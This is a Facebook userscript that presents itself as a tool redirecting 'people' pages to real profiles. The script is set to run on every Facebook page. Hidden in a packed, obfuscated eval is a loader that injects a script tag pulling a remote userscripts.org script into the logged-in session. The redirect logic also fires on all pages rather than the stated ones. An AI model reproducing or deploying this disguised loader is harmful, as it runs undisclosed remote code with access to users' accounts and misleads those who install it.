// ==UserScript==

// @name           FB People Redirect Plus + Last Update

// @namespace      Martin Stone

// @description    Redirects to real profiles from the Facebook "people" page when logged in

// @include        http://*.facebook.com/people/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


location.href = "http://" + startofurl(location.href) + "profile.php?id=" + endofurl(location.href);


function endofurl(inputString) {
   var temp = inputString;
   while (temp.indexOf("/") != -1) {
   	temp = temp.substring(temp.indexOf("/")+1, temp.length);
   }
   return temp;
}

function startofurl(inputString) {
   var temp = inputString.substring(7, inputString.length);
   temp = temp.substring(0, temp.indexOf("/")+1);
   return temp;
}